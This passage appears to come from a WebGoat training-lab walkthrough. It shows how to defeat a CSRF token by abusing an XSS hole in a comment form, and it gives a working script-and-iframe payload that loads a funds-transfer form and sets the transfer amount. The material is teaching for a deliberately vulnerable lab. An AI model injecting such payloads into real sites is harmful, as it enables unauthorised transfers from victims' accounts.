If you inspect the source code of the form, you can see that it has a hidden field called CSRToken, which will change every time you load the page. This appears to be completely random:

![](bbox=[0.12, 0.16, 0.87, 0.47])

In order to execute a CSRF in this form, you will need to exploit the XSS vulnerability in the comment form to have it load the transfer form inside an iframe tag using JavaScript. This will set the value to transfer and automatically submit the form. To do this, use the following code:

```
<script language="javascript">
    function frame_loaded(iframe)
    {
        var form =iframe.contentDocument.getElementsByTagName('Form')[1];
        form.transferFunds.value="54321";
        //form.submit();
    }
</script>

<iframe id="myframe" name="myframe" onload="frame_loaded(this)" src="http://10.7.7.5/WebGoat/attack?Screen=2&menu=900&transferFunds=main">
</iframe>
```